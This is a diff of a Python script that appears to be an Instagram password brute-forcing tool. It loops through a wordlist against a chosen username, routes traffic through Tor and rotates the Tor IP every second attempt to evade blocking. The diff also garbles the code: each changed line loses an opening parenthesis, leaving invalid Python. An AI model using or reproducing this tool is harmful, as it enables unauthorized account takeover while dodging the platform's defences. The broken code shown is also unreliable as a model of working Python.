@@ -34,12 +34,12 @@ if confirm != "yes":
     print("❌ You must subscribe to CyberSmits YouTube channel to use this tool.")
     print("➡️ Redirecting you to: https://www.youtube.com/@cybersmiths_team")
     try:
-        webbrowser.open("https://www.youtube.com/@cybersmiths_team")
+        webbrowser.open"https://www.youtube.com/@cybersmiths_team")
     except:
         try:
             os.system("termux-open-url https://www.youtube.com/@cybersmiths_team")
         except:
-            print("🔗 Please open manually: https://www.youtube.com/@cybersmiths_team")
+            print"🔗 Please open manually: https://www.youtube.com/@cybersmiths_team")
     sys.exit()
 
 # Tor proxy settings
@@ -49,7 +49,7 @@ proxies = {
 }
 
 # Get user inputs
-username = input("Enter your Instagram username: ")
+username = input"Enter your Instagram username: ")
 wordlist_path = input("Enter path to your wordlist (e.g., w.txt): ")
 
 # Load passwords
@@ -66,10 +66,10 @@ def change_ip():
         with Controller.from_port(port=9051) as controller:
             controller.authenticate()  # default is cookie authentication
             controller.signal(Signal.NEWNYM)
-            print("🔁 New Tor IP requested.\n")
+            print"🔁 New Tor IP requested.\n")
             time.sleep(5)
     except Exception as e:
-        print(f"❌ Failed to change IP: {e}")
+        printf"❌ Failed to change IP: {e}")
 
 # Start brute force loop
 session = requests.Session()
@@ -77,7 +77,7 @@ attempt = 0
 
 for password in passwords:
     attempt += 1
-    print(f"\n🔐 Trying password: {password} (Attempt {attempt})")
+    printf"\n🔐 Trying password: {password} (Attempt {attempt})")
 
     if attempt % 2 == 0:
         change_ip()
